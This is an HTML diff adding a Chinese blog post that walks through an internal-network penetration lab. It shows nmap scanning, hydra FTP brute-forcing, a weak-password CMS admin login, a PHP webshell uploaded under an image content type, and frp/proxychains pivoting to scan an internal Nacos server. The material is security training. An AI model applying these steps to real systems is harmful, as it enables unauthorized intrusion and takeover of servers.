@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="G00d">
+
+
+    <meta name="subtitle" content="没有人会一直一帆风顺，失败和挫折才是人生常态">
+
+
+
+    <meta name="keywords" content="G00dddd">
+
+
+<title>内网渗透-三层网络渗透学习1 | G00d`s Blog</title>
+
+
+
+    <link rel="icon" href="../favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="../css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="../js/script.js"></script>
+    
+    <script src="../js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //创建雪花元素
+    function snow() {
+      //获取视窗的宽高
+      var width = window.innerWidth;
+      var height = window.innerHeight;
+  
+      var snow = document.createElement("div");             //创建元素
+  
+      //初始化雪花样式
+      size = Math.random() * 15 + 10;                          //随机生成雪花大小
+      snow.style.width = size + "px";
+      snow.style.height = size + "px";
+      snow.style.background = "url(img/雪花" + Math.floor((Math.random()*6)+1) + ".png) no-repeat";   //1-6随机选择雪花的图片
+      // snow.style.background = "url(./雪花.png) no-repeat";
+      snow.style.backgroundSize = '100% 100%';
+      snow.style.position = "fixed";                        //元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会移动
+      snow.style.filter = "blur(1px)";                      //给图片设置高斯模糊
+      snow.style.left = Math.random() * width + 'px';         //随机生成雪花的初始位置
+      snow.style.top = "10px";
+      snow.style.opacity = parseInt(Math.random()*10)/2;   //随机生成雪花的透明度
+  
+      //向body添加元素
+      document.body.appendChild(snow);
+  
+      //创建定时器，每30ms雪花下落一次
+      var timer = setInterval(function () {
+        snow.style.top = parseInt(snow.style.top) + 3 + 'px';     //每次下落3px
+  
+        //当雪花到达底部后清除元素
+        if (parseInt(snow.style.top) >= height) {
+          clearInterval(timer);
+          snow.parentNode.removeChild(snow)
+        }
+      }, 30)
+    }
+  
+    //页面加载完成执行函数
+    window.onload = function play() {
+      //创建定时器，每300ms生成一朵雪花
+      setInterval(function () {
+        snow()
+      }, 300)
+    }
+  </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //蜘蛛网特效
+    !
+    function() {
+        function n(n, e, t) {
+            return n.getAttribute(e) || t
+        }
+        function e(n) {
+            return document.getElementsByTagName(n)
+        }
+        function t() {
+            var t = e("script"),
+            o = t.length,
+            i = t[o - 1];
+            return {
+                l: o,
+                z: n(i, "zIndex", -1),
+                o: n(i, "opacity", .9),   //透明度
+                c: n(i, "color", "255, 102, 153"),   //颜色
+                n: n(i, "count", 99)
+            }
+        }
+        function o() {
+            a = m.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+            c = m.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
+        }
+        function i() {
+            r.clearRect(0, 0, a, c);
+            var n, e, t, o, m, l;
+            s.forEach(function(i, x) {
+                for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 : 1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1, 1), e = x + 1; e < u.length; e++) n = u[e],
+                null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l = o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o, i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t / 2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y), r.lineTo(n.x, n.y), r.stroke()))
+            }),
+            x(i)
+        }
+        var a, c, u, m = document.createElement("canvas"),
+        d = t(),
+        l = "c_n" + d.l,
+        r = m.getContext("2d"),
+        x = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
+        function(n) {
+            window.setTimeout(n, 1e3 / 45)
+        },
+        w = Math.random,
+        y = {
+            x: null,
+            y: null,
+            max: 2e4
+        };
+        m.id = l,
+        m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z + ";opacity:" + d.o,
+        e("body")[0].appendChild(m),
+        o(),
+        window.onresize = o,
+        window.onmousemove = function(n) {
+            n = n || window.event,
+            y.x = n.clientX,
+            y.y = n.clientY
+        },
+        window.onmouseout = function() {
+            y.x = null,
+            y.y = null
+        };
+        for (var s = [], f = 0; d.n > f; f++) {
+            var h = w() * a,
+            g = w() * c,
+            v = 2 * w() - 1,
+            p = 2 * w() - 1;
+            s.push({
+                x: h,
+                y: g,
+                xa: v,
+                ya: p,
+                max: 6e3
+            })
+        }
+        u = s.concat([y]),
+        setTimeout(function() {
+            i()
+        },
+        100)
+    } ();
+
+    //蜘蛛网特效
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">G00d&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">G00d&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">内网渗透-三层网络渗透学习1</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">G00d</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十二月 18, 2024&nbsp;&nbsp;19:26:33</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这里直接放原创师傅的blog</span><br><span class="line"><span class="symbol">https:</span>//www.bilibili.com/video/BV<span class="number">1</span>UgSPYxEr<span class="number">5</span>/?spm_id_from<span class="operator">=</span><span class="number">888.80997</span>.embed_other.whitelist&amp;t<span class="operator">=</span><span class="number">28.079751</span>&amp;bvid<span class="operator">=</span>BV<span class="number">1</span>UgSPYxEr<span class="number">5</span>&amp;vd_source<span class="operator">=</span><span class="number">6605</span><span class="keyword">c</span><span class="number">085</span><span class="keyword">cc</span><span class="number">4</span>d<span class="number">3177</span>b<span class="number">8873</span>b<span class="number">14</span>ce<span class="number">5</span>df<span class="number">84</span>d</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">https:</span>//blog.csdn.net/aizhou<span class="number">1</span>/article/details/<span class="number">143874323</span>?ops_request_misc<span class="operator">=</span><span class="variable">%257</span>B<span class="variable">%2522</span>request<span class="variable">%255</span>Fid<span class="variable">%2522</span><span class="variable">%253</span>A<span class="variable">%25225</span>a<span class="number">854595</span>be<span class="number">334</span>f<span class="number">701983</span>d<span class="number">44</span>d<span class="number">9872</span>f<span class="number">990</span><span class="variable">%2522</span><span class="variable">%252</span>C<span class="variable">%2522</span>scm<span class="variable">%2522</span><span class="variable">%253</span>A<span class="variable">%252220140713</span>.<span class="number">130102334</span>.pc<span class="variable">%255</span>Fall.<span class="variable">%2522</span><span class="variable">%257</span>D&amp;request_id<span class="operator">=</span><span class="number">5</span>a<span class="number">854595</span>be<span class="number">334</span>f<span class="number">701983</span>d<span class="number">44</span>d<span class="number">9872</span>f<span class="number">990</span>&amp;biz_id<span class="operator">=</span><span class="number">0</span>&amp;utm_medium<span class="operator">=</span>distribute.pc_search_result.none-task-blog<span class="number">-2</span>~all~first_rank_ecpm_v<span class="number">1</span>~rank_v<span class="number">31</span>_ecpm<span class="number">-1</span><span class="number">-143874323</span>-<span class="keyword">null</span>-<span class="keyword">null</span>.<span class="number">142</span>^v<span class="number">100</span>^pc_search_result_base<span class="number">3</span>&amp;utm_term<span class="operator">=</span><span class="variable">%E6</span><span class="variable">%89</span><span class="variable">%8</span>B<span class="variable">%E6</span><span class="variable">%8</span>A<span class="variable">%8</span>A<span class="variable">%E6</span><span class="variable">%89</span><span class="variable">%8</span>B<span class="variable">%E5</span><span class="variable">%AD</span><span class="variable">%A6</span><span class="variable">%E4</span><span class="variable">%B9</span><span class="variable">%A0</span><span class="variable">%E4</span><span class="variable">%B8</span><span class="variable">%89</span><span class="variable">%E5</span><span class="variable">%B1</span><span class="variable">%82</span><span class="variable">%E7</span><span class="variable">%BD</span><span class="variable">%91</span><span class="variable">%E7</span><span class="variable">%BB</span><span class="variable">%9</span>C<span class="variable">%E6</span><span class="variable">%B8</span><span class="variable">%97</span><span class="variable">%E9</span><span class="variable">%80</span><span class="variable">%8</span>F<span class="variable">%E5</span><span class="variable">%8</span>F<span class="variable">%8</span>A<span class="variable">%E7</span><span class="variable">%BB</span><span class="variable">%BC</span><span class="variable">%E5</span><span class="variable">%90</span><span class="variable">%88</span><span class="variable">%E6</span><span class="variable">%B8</span><span class="variable">%97</span><span class="variable">%E9</span><span class="variable">%80</span><span class="variable">%8</span>F<span class="variable">%E6</span><span class="variable">%A6</span><span class="variable">%82</span><span class="variable">%E5</span><span class="variable">%BF</span><span class="variable">%B5</span>&amp;spm<span class="operator">=</span><span class="number">1018.2226</span>.<span class="number">3001.4187</span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">https:</span>//mp.weixin.qq.com/s/dYIukeFpgz<span class="number">68</span>ih<span class="number">10</span>uF_Eow</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该内网选材于<span class="number">2020</span>年网鼎杯决赛本次学习内容包含<span class="comment">(信息收集、信息泄露、代码审计流程、后台漏洞、专项漏洞训练、组合拳webshell、主机漏洞等)</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//bcbea353691245e4a72d370238e7bd73.jpeg" alt="img"></p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">环境及所需工具下载地址：</span><br><span class="line"><span class="symbol">https:</span>/<span class="regexp">/pan.quark.cn/s</span><span class="regexp">/9d68fc9eea63</span></span><br><span class="line"><span class="regexp">动态更新环境地址：</span></span><br><span class="line"><span class="regexp">https:/</span><span class="regexp">/pan.quark.cn/s</span><span class="regexp">/a096cebb578e</span></span><br><span class="line"><span class="regexp">* 网盘可能由于波动，导致环境丢失，会在此地址动态更新下载链接</span></span><br><span class="line"><span class="regexp">DMZ服务器账号密码：administrator/</span>P<span class="variable">@ssw0rd1</span></span><br><span class="line">二层服务器账号密码：dmz/P<span class="variable">@ssw0rd2</span></span><br><span class="line">三层服务器账号密码：pro/P<span class="variable">@ssw0rd3</span></span><br><span class="line">以上信息在视频和描述中已说明</span><br><span class="line">请确保安装盘硬盘容量大于<span class="number">15</span>G</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241218201349081.png" alt="image-20241218201349081"></p>
+<h1 id="1-DMZ区渗透"><a href="#1-DMZ区渗透" class="headerlink" title="1.DMZ区渗透"></a>1.DMZ区渗透</h1><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$  nmap <span class="comment">--min-rate 100000 -p- 192.168.1.121</span></span><br><span class="line">Starting Nmap <span class="number">7.94</span>SVN ( https://nmap.org ) at <span class="number">2024</span><span class="number">-12</span><span class="number">-18</span> <span class="number">20</span>:<span class="number">18</span> CST</span><br><span class="line"><span class="built_in">Warning</span>: <span class="number">192.168</span><span class="number">.1</span><span class="number">.121</span> giving up <span class="keyword">on</span> port because retransmission cap hit (<span class="number">10</span>).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.121</span></span><br><span class="line">Host <span class="keyword">is</span> up (<span class="number">0.00085</span>s latency).</span><br><span class="line"><span class="keyword">Not</span> shown: <span class="number">39970</span> filtered tcp ports (<span class="keyword">no</span>-response), <span class="number">25550</span> closed tcp ports (<span class="keyword">reset</span>)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line"><span class="number">21</span>/tcp    <span class="keyword">open</span>  ftp</span><br><span class="line"><span class="number">135</span>/tcp   <span class="keyword">open</span>  msrpc</span><br><span class="line"><span class="number">139</span>/tcp   <span class="keyword">open</span>  netbios-ssn</span><br><span class="line"><span class="number">445</span>/tcp   <span class="keyword">open</span>  microsoft-ds</span><br><span class="line"><span class="number">3306</span>/tcp  <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">5985</span>/tcp  <span class="keyword">open</span>  wsman</span><br><span class="line"><span class="number">8080</span>/tcp  <span class="keyword">open</span>  http-proxy</span><br><span class="line"><span class="number">47001</span>/tcp <span class="keyword">open</span>  winrm</span><br><span class="line"><span class="number">49664</span>/tcp <span class="keyword">open</span>  <span class="type">unknown</span></span><br><span class="line"><span class="number">49665</span>/tcp <span class="keyword">open</span>  <span class="type">unknown</span></span><br><span class="line"><span class="number">49666</span>/tcp <span class="keyword">open</span>  <span class="type">unknown</span></span><br><span class="line"><span class="number">49668</span>/tcp <span class="keyword">open</span>  <span class="type">unknown</span></span><br><span class="line"><span class="number">49669</span>/tcp <span class="keyword">open</span>  <span class="type">unknown</span></span><br><span class="line"><span class="number">49670</span>/tcp <span class="keyword">open</span>  <span class="type">unknown</span></span><br><span class="line"><span class="number">49671</span>/tcp <span class="keyword">open</span>  <span class="type">unknown</span></span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">72</span>:<span class="number">71</span>:C2 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">7.56</span> seconds</span><br><span class="line"></span><br><span class="line">这里的<span class="number">49</span>开头的端口用于微软服务，不需要看</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这里有ftp服务器，考虑用hybra爆破一下</span><br><span class="line">$ hydra -L <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/m</span>etasploit<span class="regexp">/http_default_users.txt -P /u</span>sr<span class="regexp">/share/</span>wordlists<span class="regexp">/metasploit/u</span>nix_passwords.txt -t <span class="number">10</span></span><br><span class="line"> ftp:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.121</span></span><br><span class="line">FTP账号密码为：wwwroot/<span class="number">1</span></span><br><span class="line">直接登录就好，这里发现有cms的源码，进行白盒测试</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241218204735429.png" alt="image-20241218204735429"><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241218211306347.png" alt="image-20241218211306347"></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">导入Seay源代码审计系统中，可以自动审计，会列出可能有漏洞的地方</span><br><span class="line">也可以直接搜索变量<span class="keyword">move_uploaded_file，这是系统更改上传文件的地方</span></span><br><span class="line"><span class="keyword"></span>详细看这个文件夹下的代码</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241218210129482.png" alt="image-20241218210129482"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241218210609098.png" alt="image-20241218210609098"></p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">进入http<span class="punctuation">:</span><span class="comment">//192.168.1.121:8080/dede  有弱口令登录后台</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241218211743652.png" alt="image-20241218211743652"></p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">找到文件上传点 内容维护-&gt;添加文档-&gt;缩略图  ，传一句话木马</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241218231437108.png" alt="image-20241218231437108"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241218232013536.png" alt="image-20241218232013536"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">直接传这个就行，注意文件类型那里是image但是文件名必须是php</span><br><span class="line">找到上传的那个包看响应包<span class="regexp">/uploads/</span>allimg<span class="regexp">/241218/</span><span class="number">1</span>-<span class="number">24121</span>R333440-L.php</span><br><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.121</span>:<span class="number">8080</span><span class="regexp">//u</span>ploads<span class="regexp">/allimg/</span><span class="number">241218</span>/<span class="number">1</span>-<span class="number">24121</span>R333440-L.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241218233552248.png" alt="image-20241218233552248"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241218233639800.png" alt="image-20241218233639800"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241218233737718.png" alt="image-20241218233737718"></p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一个flag在桌面上，这个web权限是<span class="keyword">system</span>   emmmmm</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241218234003699.png" alt="image-20241218234003699"></p>
+<h1 id="2-二层内网渗透"><a href="#2-二层内网渗透" class="headerlink" title="2.二层内网渗透"></a>2.二层内网渗透</h1><p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241218234426428.png" alt="image-20241218234426428"></p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">确定内网网段<span class="number">192</span>.<span class="number">168</span>.<span class="number">5</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line">传fscan发现二层内网主机<span class="built_in">ip</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241218235011943.png" alt="image-20241218235011943"></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">frps<span class="selector-class">.exe</span> -c frps<span class="selector-class">.toml</span></span><br><span class="line">frpc<span class="selector-class">.exe</span> -c frpc<span class="selector-class">.toml</span></span><br><span class="line">上线了之后用proxifier代理转发一下,设置一下全局规则</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241219002137568.png" alt="image-20241219002137568"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241219083705401.png" alt="image-20241219083705401"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241219083732999.png" alt="image-20241219083732999"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241219083747841.png" alt="image-20241219083747841"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这时候就可以对二层内网进行渗透了</span><br><span class="line">用vi <span class="regexp">/etc/</span>proxychains4.conf</span><br><span class="line">proxychains4 dirsearch -u http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">5.129</span>/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241219085059214.png" alt="image-20241219085059214"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">找到有phpinfo看到了绝对路径 <span class="regexp">/var/</span>www<span class="regexp">/html/</span>phpinfo.php</span><br><span class="line">再看一下<span class="number">8848</span>端口，爆了一下目录发现有nacos http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">5.129</span>:<span class="number">8848</span><span class="regexp">/nacos/</span><span class="comment">#/login，继续用nikto</span></span><br><span class="line">proxychains4 nikto -host http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">5.129</span>:<span class="number">8848</span><span class="regexp">/nacos/</span><span class="comment">#/login</span></span><br><span class="line">然后配置一下burp，在burp上开启Network-Connections-socks proxy</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241219093850522.png" alt="image-20241219093850522"></p>
+<p>​	<img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241219093708298.png" alt="image-20241219093708298"></p>
